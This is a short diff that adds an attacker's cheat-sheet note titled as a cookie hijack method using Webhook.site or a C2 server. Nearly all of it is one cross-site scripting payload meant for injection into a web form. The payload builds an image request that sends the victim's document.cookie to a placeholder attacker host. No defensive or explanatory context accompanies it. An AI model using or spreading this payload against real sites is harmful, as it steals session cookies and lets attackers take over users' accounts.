@@ -1,0 +1,6 @@
+#############
+Cookie Hijack via Webhook.site or a C2 server 
+#############
+
+to Hijack a use's cookie inject the JS Payload if the the form
+<script>var i = new Image; i.src="https://<WebHook.site OR C2 Server/?>"+document.cookie;</script>
